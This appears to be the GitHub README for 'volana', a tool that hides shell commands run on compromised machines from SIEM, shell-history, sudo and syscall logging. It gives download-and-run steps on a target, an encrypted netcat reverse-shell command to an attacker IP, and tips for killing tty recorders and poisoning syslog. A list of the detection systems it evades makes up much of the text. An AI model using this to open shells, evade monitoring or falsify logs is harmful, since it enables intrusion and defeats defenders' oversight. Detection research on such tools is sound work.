
<div align="center">
<h3><i>volana<sub> (moon in malagasy)</i></h3>
<img src="https://github.com/ariary/volana/blob/main/img/moon.png">


<p><strong><pre><code>{ <a href="#usage">Use it</a> ; <a href="#hide-from">🌚<sub>(hide from)</sub></a>; <a href="#visible-for">🌞<sub>(detected by)</sub></a> } </code></pre></strong></p>
<h4> Shell command obfuscation to avoid SIEM/detection system </h4>
 <p> During pentest, an important aspect is to <b>be stealth</b>. For this reason you should <b>clear your tracks after your passage</b>. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the afterwards cleaning part alone useless.<br><br><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana executes for you). Like this you <b>clear your tracks DURING your passage</b></p>
</div>

## Usage

You need to get an interactive shell. (Find a way to spawn it, you are a hacker, it's your job ! [otherwise](#from-non-interactive-shell)). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed 
```shell
## Download it from github release
## If you do not have internet access from compromised machine, find another way
curl -lO -L https://github.com/ariary/volana/releases/latest/download/volana

## Execute it
./volana

## You are now under the radar
volana » echo "Hi SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cocky
volana » [command]
```

Keyword for volana console:
* `ring`: enable ring mode ie each command is launched with plenty others to cover tracks (from solution that monitor system call)
* `exit`: exit volana console

### from non interactive shell

Imagine you have a non interactive shell (webshell or blind rce), you could use `encrypt` and `decrypt` subcommand.
Previously, you need to build `volana` with embedded encryption key.

**On attacker machine**
```shell
## Build volana with encryption key
make build.volana-with-encryption

## Transfer it on TARGET (the unique detectable command)
## [...]

## Encrypt the command you want to stealthy execute
## (Here a nc bindshell to obtain a interactive shell)
volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash"
**encrypted cmd**
```

Copy encrypted command and executed it with your rce **on target machine**
```shell
./volana decr [encrypted_command]
## Now you have a bindshell shell, spawn it to make it interactive and use volana usually to be stealth (.volana)

```

***Why not just hide command with `echo [command] | base64` ?***
And decode on target with `echo [encoded_command] | base64 -d | bash`

Because we want to be protected against system that trigger alert for `base64` use or that seek base64 text in command. Also we want to make investigation difficult and base64 isn't a real brake.

## Detection

Keep in mind that `volana` is not a miracle that will make you totally invisible. It aim is to make intrusion detection and investigation harder.

By detected we mean if we are able to trigger an alert if a certain command has been executed.


### Hide from

Only the `volana` launch command line will be catched

* Detection systems that are based on history command output
* Detection systems that are based on history files
  * `.bash_history`, ".zsh_history" etc ..
* Detection systems that are based on bash debug traps
* Detection systems that are based on sudo built-in logging system
* Detection systems tracing all processes syscall system-wide (eg `opensnoop`)
* Terminal (tty) recorder (`script`, `screen -L`, [`sexonthebash`](https://github.com/ariary/sexonthebash), `ovh-ttyrec`, etc..)
  * Easy to detect & avoid: `pkill -9 script`
  * Not a common case
  * `screen` is a bit more difficult to avoid, however it does not register input (secret input: `stty -echo` => avoid)
  * Could be avoid with `volana` with encryption 

### Visible for

* Detection systems that have alert for unknown command (volana one)
* Detection systems that are based on keylogger
  * Easy to avoid: copy/past commands
  * Not a common case
* Detection systems that are based on syslog files (e.g. `/var/log/auth.log`)
  * Only for `sudo` or `su` commands
  * syslog file could be modified and thus be poisoned as you wish (e.g for */var/log/auth.log*:`logger -p auth.info "No hacker is poisoning your syslog solution, don't worry"
* Detection systems that are based on syscall (eg auditd,LKML/eBPF)
  * Difficult to analyze, could be make unreadable by making several diversion syscalls
* Custom `LD_PRELOAD` injection to make log
  * Not a common case at all

## Bug bounty

Sorry for the clickbait title, but no money will be provided for contibutors. 🐛

 Let me know if you have found:
* a way to detect `volana`
* a way to spy console that don't detect `volana` commands
* a way to avoid a detection system

[Report here](https://github.com/ariary/volana/issues/new/choose)

 
## Credit
* [8 ways to spy on console](https://github.com/annmuor/zn2021_8ways]
* [moonwalk](https://github.com/mufeedvh/moonwalk): similar tool that clear tracks AFTER passage
